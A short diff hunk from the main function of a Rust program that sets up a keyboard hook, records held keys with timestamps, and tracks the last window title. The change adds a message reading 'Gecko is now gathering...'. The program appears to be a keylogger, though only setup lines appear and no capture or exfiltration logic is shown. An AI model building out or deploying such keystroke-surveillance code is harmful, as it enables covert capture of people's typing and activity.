@@ -8,7 +8,7 @@ fn main() {
     let mut held_keys: HashMap<KeyboardKey, Instant> = HashMap::new();
     let h = keyboard_hook().unwrap();
     let mut last_title = String::new();
-
+    println!("Gecko is now gathering...");
 
         loop {
             if exitcondition() {
